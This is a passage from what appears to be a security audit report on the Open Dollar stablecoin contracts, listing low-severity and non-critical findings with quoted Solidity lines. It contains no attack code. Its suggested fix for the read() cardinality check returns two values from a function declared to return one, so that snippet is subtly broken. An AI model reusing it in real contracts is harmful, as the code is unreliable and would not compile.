9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Image field does not point to an image but the testnet website</h2>\n<p>There is 1 instance of this issue:</p>\n<p>In the below string variable contractMetaData, we can observe the image field points as such <code>\"image\": \"https://app.opendollar.com/collectionImage.png\"</code>. If we follow the link it leads us to the testnet website and not an image.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contractMetaData</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:     </span><span class=\"mtk8\">&#39;{&quot;name&quot;: &quot;Open Dollar Vaults&quot;,&quot;description&quot;: &quot;Tradable Vaults for the Open Dollar stablecoin protocol. Caution! Trading this NFT means trading the ownership of your Vault in the Open Dollar protocol and all of the assets/collateral inside each Vault.&quot;,&quot;image&quot;: &quot;https://app.opendollar.com/collectionImage.png&quot;,&quot;external_link&quot;: &quot;https://opendollar.com&quot;}&#39;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"l-02-missing-check-in-constructor-to-see-if-quoteperiod-is-not-zero\" style=\"position:relative;\"><a href=\"#l-02-missing-check-in-constructor-to-see-if-quoteperiod-is-not-zero\" aria-label=\"l 02 missing check in constructor to see if quoteperiod is not zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Missing check in constructor to see if quotePeriod is not zero</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L59\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L59</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_quotePeriod</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"l-03-missing-cardinality-check-in-function-read\" style=\"position:relative;\"><a href=\"#l-03-missing-cardinality-check-in-function-read\" aria-label=\"l 03 missing cardinality check in function read permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Missing cardinality check in function read()</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L91C1-L101C4\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L91C1-L101C4</a></p>\n<p>On Line 93, the comment mentions that the read() function should revert with “OLD!” if the pool does not have enough cardinality or initialized history. But there is no check done for the cardinality, which can return an incorrect quote.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">092</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">read</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">093</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// This call may revert with &#39;OLD!&#39; if the pool doesn&#39;t have enough cardinality or initialized history</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">094</span><span class=\"mtk1\">:     (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">095</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">096</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">tick</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">097</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">098</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">099</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_result</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<p>Solution:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">read</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// If the pool doesn&#39;t have enough history return false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOldestObservationSecondsAgo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// Consult the query with a TWAP period of quotePeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:     (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// Calculate the quote amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">tick</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">: </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// Process the quote result to 18 decimal quote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_result</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h2 id=\"l-04-rounding-down-in-_exitcollateral-function-can-cause-loss-of-precision-leading-to-loss-of-funds-for-users\" style=\"position:relative;\"><a href=\"#l-04-rounding-down-in-_exitcollateral-function-can-cause-loss-of-precision-leading-to-loss-of-funds-for-users\" aria-label=\"l 04 rounding down in _exitcollateral function can cause loss of precision leading to loss of funds for users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Rounding down in _exitCollateral() function can cause loss of precision leading to loss of funds for users</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/CommonActions.sol#L118\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/CommonActions.sol#L118</a></p>\n<p>In the function <a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/CommonActions.sol#L118\">_exitCollateral()</a>, users can experience loss of funds if the wad amount is smaller than the decimals representation in the denominator.</p>\n<p>The below code snippet is from the CommonActions.sol contract is inherited in the BasicActions.sol contract. This _exitCollateral() function is called when the freeTokenCollateral() function in the BasicActions.sol contract is called. This function does the operation below based on the decimals of the ERC20 token being used. In case the numerator i.e. the _wad amount is smaller than the denominator, the final _weiAmount rounds down to zero. This can lead to loss of funds for the user who tries to exit with his collateral.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CommonActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weiAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_wad</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** (</span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_decimals</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">__collateralJoin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">exit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_weiAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"n-01-remove-redundant-condition-in-_isnotproxy-function\" style=\"position:relative;\"><a href=\"#n-01-remove-redundant-condition-in-_isnotproxy-function\" aria-label=\"n 01 remove redundant condition in _isnotproxy function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Remove redundant condition in _isNotProxy() function</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L154C1-L156C4\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/Vault721.sol#L154C1-L156C4</a></p>\n<p>The condition <code>ODProxy(_userRegistry[_user]).OWNER() != _user</code> is redundant and the first condition itself is sufficient to determine whether a user has an ODProxy or not. There’s never a situation where the second condition could evaluate to true. Look at the table below:</p>\n<table>\n<thead>\n<tr>\n<th>First condition</th>\n<th>Second condition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>True</td>\n<td>Not checked since first is true</td>\n</tr>\n<tr>\n<td>False</td>\n<td>False</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isNotProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_userRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk11\">ODProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_userRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">OWNER</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<h2 id=\"n-02-remove-if-_dst--address0-revert-zeroaddress-redundant-check-since-it-is-already-checked-in-_aftertokentransfer-function\" style=\"position:relative;\"><a href=\"#n-02-remove-if-_dst--address0-revert-zeroaddress-redundant-check-since-it-is-already-checked-in-_aftertokentransfer-function\" aria-label=\"n 02 remove if _dst  address0 revert zeroaddress redundant check since it is already checked in _aftertokentransfer function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Remove <code>if (_dst == address(0)) revert ZeroAddress();</code> redundant check since it is already checked in <code>_afterTokenTransfer()</code> function</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L139\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L139</a></p>\n<p>Remove below check:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_dst</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ZeroAddress</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Check already done before in _afterTokenTransfer() function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">Vault721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:       </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isNotProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_build</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:       } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_userRegistry</span><span class=\"mtk1\">[</span><span class=\"mtk12\">to</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:       }</span></span></span></code></pre>\n<h2 id=\"n-03-function-read-does-not-revert-with-old-as-mentioned-in-comments\" style=\"position:relative;\"><a href=\"#n-03-function-read-does-not-revert-with-old-as-mentioned-in-comments\" aria-label=\"n 03 function read does not revert with old as mentioned in comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Function read() does not revert with “OLD!” as mentioned in comments</h2>\n<p>There is 1 instance of this issue:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L91C1-L101C4\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/oracles/CamelotRelayer.sol#L91C1-L101C4</a></p>\n<p>Function does not revert with “OLD!” since there is no such revert message in the consult function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">CamelotRelayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">092</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">read</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">093</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">// This call may revert with &#39;OLD!&#39; if the pool doesn&#39;t have enough cardinality or initialized history </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">094</span><span class=\"mtk1\">:     (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">095</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAmount</span><span 